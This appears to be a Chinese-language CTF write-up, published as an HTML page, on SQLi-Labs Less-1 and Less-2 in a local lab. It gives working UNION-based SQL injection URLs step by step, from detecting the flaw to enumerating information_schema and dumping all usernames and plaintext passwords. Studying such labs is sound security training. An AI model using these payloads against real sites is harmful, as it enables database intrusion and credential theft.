@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-1 & Less-2 联合查询注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-1 & Less-2 联合查询注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.22 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, MySQL</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-1 (字符型注入) / Less-2 (整型注入)</li>
+        <li><strong>提示：</strong>GET请求，基于报错，使用 UNION 联合查询</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>针对基于报错的联合查询注入，通用的测试及利用流程如下：首先，测试是否存在 SQL 注入点（通过输入单引号破坏原有语法）。其次，使用 <code>ORDER BY</code> 语句确定后台查询的字段数量。接着，使用 <code>UNION SELECT</code> 语句探测前端页面的回显点（即能够将数据库查询结果输出到页面的位置）。最后，利用 <code>information_schema</code> 系统元数据表，逐级获取数据库名、表名、列名，并获取目标表中的敏感数据。</p>
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：Less-1 探测注入点与字段数</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=1'</code></p>
+    <p><strong>解释：</strong>在正常参数 <code>1</code> 后面加入单引号，用于尝试闭合后台 SQL 语句中的单引号。</p>
+    <p><strong>回显现象：</strong>页面抛出黄色的 SQL 语法错误提示：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code>。</p>
+    <p><strong>原理分析：</strong>后台原查询语句大概率是 <code>SELECT * FROM users WHERE id = '$id' LIMIT 0,1</code>。输入 <code>1'</code> 后，实际执行变为 <code>id = '1''</code>，多余的引号破坏了语法，证明存在字符型注入。</p>
+
+    <p><strong>第二步：Less-1 确定字段数</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=1' ORDER BY 3 --+</code></p>
+    <p><strong>回显现象：</strong>页面正常回显账号密码（Dumb / Dumb）。</p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=1' ORDER BY 4 --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>Unknown column '4' in 'order clause'</code>。</p>
+    <p><strong>解释与原理：</strong><code>ORDER BY</code> 用于按指定列排序，当指定的列数超出实际查询列数时会报错。据此推断后台查询共有 3 个字段。<code>--+</code> 是注释符（URL 中 <code>+</code> 代表空格），用于将后台剩余的 <code>' LIMIT 0,1</code> 注释掉，保证语法正确。</p>
+
+    <p><strong>第三步：Less-1 探测回显点</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2,3 --+</code></p>
+    <p><strong>解释：</strong>将 <code>id</code> 设为 <code>-1</code>（使前一条查询结果为空），利用 <code>UNION SELECT</code> 拼接查询数字 1、2、3。</p>
+    <p><strong>回显现象：</strong>页面原本显示账号密码的位置，分别输出了数字 <code>2</code> 和 <code>3</code>，数字 <code>1</code> 未显示。</p>
+    <p><strong>原理分析：</strong>说明后端代码只将查询结果的第 2 列和第 3 列输出到了前端页面中。这两个位置即为“回显点”，后续可将数字替换为需要查询的 SQL 函数或字段。</p>
+
+    <p><strong>第四步：Less-1 获取基础信息</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1, database(), version() --+</code></p>
+    <p><strong>解释：</strong>将回显点替换为数据库内置函数，<code>database()</code> 查当前库名，<code>version()</code> 查版本。</p>
+    <p><strong>回显现象：</strong>页面回显 <code>security</code> 和 <code>5.7.26</code>。</p>
+    <p><strong>原理分析：</strong>确认当前数据库名为 <code>security</code>，版本 5.7.26 表示支持 <code>information_schema</code> 系统库。</p>
+
+    <p><strong>第五步：Less-1 获取表名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+</code></p>
+    <p><strong>解释：</strong><code>information_schema.tables</code> 是 MySQL 自带的元数据表，存放所有表的信息。<code>group_concat()</code> 函数用于将多行查询结果合并为一行字符串，防止页面只显示第一行。<code>WHERE table_schema='security'</code> 限制了只查询当前库的表。</p>
+    <p><strong>回显现象：</strong>回显点 3 的位置输出了 <code>emails, referrers, uagents, users</code>。</p>
+
+    <p><strong>第六步：Less-1 获取列名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users' --+</code></p>
+    <p><strong>解释：</strong>改为查询 <code>information_schema.columns</code> 表，增加 <code>AND table_name='users'</code> 条件锁定目标表。</p>
+    <p><strong>回显现象：</strong>回显点 3 的位置输出了列名 <code>id, username, password</code>。</p>
+
+    <p><strong>第七步：Less-1 提取最终数据</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users --+</code></p>
+    <p><strong>解释：</strong>不再查询系统表，直接查询目标库 <code>security</code> 下的目标表 <code>users</code>。将 <code>username</code> 放入回显点 2，将 <code>password</code> 放入回显点 3。</p>
+    <p><strong>回显现象：</strong>页面回显点 2 输出了一长串所有用户名，回显点 3 输出了对应的所有密码明文。</p>
+
+    <p><strong>第八步：Less-2 整型注入完整流程</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=1'</code></p>
+    <p><strong>回显现象：</strong>页面报错 <code>You have an error in your SQL syntax... near '' LIMIT 0,1'</code>。</p>
+    <p><strong>原理分析：</strong>此处报错信息中没有多余的单引号包裹，说明后台代码为 <code>id = $id</code>（整型），不需要闭合单引号。</p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=1 ORDER BY 4</code></p>
+    <p><strong>回显现象：</strong>页面报错 <code>Unknown column '4' in 'order clause'</code>。确认字段数为 3。</p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,3</code></p>
+    <p><strong>回显现象：</strong>页面回显数字 <code>2</code> 和 <code>3</code>。确认回显点。</p>
+    <p><strong>输入最终 Payload：</strong><code>http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users</code></p>
+    <p><strong>回显现象：</strong>页面成功输出所有账号密码。</p>
+    <p><strong>解释：</strong>因为是整型注入，不需要闭合单引号和加注释符，直接在 URL 后面拼接空格和 SQL 语句即可执行。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>注释符的使用：</strong>在字符型注入中，闭合引号后必须使用 <code>--+</code> 或 <code>%23</code> 将后方原有语句注释掉，否则会因语法错误无法执行注入语句。</li>
+        <li><strong>回显点的前提：</strong>使用 <code>UNION SELECT</code> 时，若前台查到了数据，会优先显示前台数据导致恶意查询被覆盖。因此必须使用 <code>id=-1</code> 等不存在的条件让前一条查询为空。</li>
+        <li><strong>整型与字符型的区别：</strong>字符型需 <code>'</code> 闭合，整型直接拼接。测试方法为输入 <code>?id=1'</code>，观察报错信息中是否因为多出单引号导致语法错误。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>information_schema：</strong>MySQL 5.0 以上版本自带的元数据表。<code>tables</code> 记录表信息，<code>columns</code> 记录列信息，是 SQL 注入中获取库表结构的核心依赖。</li>
+        <li><strong>group_concat() 函数：</strong>MySQL 特有的聚合函数，用于将多行查询结果用逗号连接成一行字符串输出，突破页面仅渲染第一行数据的限制。</li>
+        <li><strong>回显点：</strong>指 Web 页面中接收并渲染数据库查询结果的具体位置。通过输入数字标识（如 1,2,3...）可以测试哪些列的数据会被展示到前端。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
